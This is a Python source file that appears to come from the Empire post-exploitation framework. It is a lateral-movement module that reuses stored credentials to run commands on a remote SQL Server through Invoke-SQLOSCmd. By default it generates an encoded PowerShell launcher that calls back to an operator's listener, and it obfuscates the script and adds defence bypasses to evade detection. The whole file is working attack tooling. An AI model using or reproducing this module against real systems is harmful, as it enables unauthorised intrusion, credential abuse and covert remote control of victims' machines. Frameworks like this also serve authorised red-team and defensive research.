from __future__ import print_function

from builtins import str
from builtins import object

from empire.server.utils import data_util
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        cred_id = params["CredID"]
        if cred_id != "":
            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""
            (cred_id, credType, domainName, username, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
            if domainName != "":
                params["UserName"] = str(domainName) + "\\" + str(username)
            else:
                params["UserName"] = str(username)
            if password != "":
                params["Password"] = password

        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        userAgent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        instance = params['Instance']
        command = params['Command']
        username = params['UserName']
        password = params['Password']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']


        module_source = main_menu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
        module_code = ""
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            with open(module_source, 'r') as source:
                module_code = source.read()
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""
        script = module_code


        if command == "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                print(helpers.color("[!] Invalid listener: " + listener_name))
                return ""
            else:
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=userAgent, proxy=proxy, proxyCreds=proxy_creds,
                                                               bypasses=params['Bypasses'])
                if launcher == "":
                    return ""
                else:
                    command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher


        script_end = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)

        if username != "":
            script_end += " -UserName "+username
        if password != "":
            script_end += " -Password "+password

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
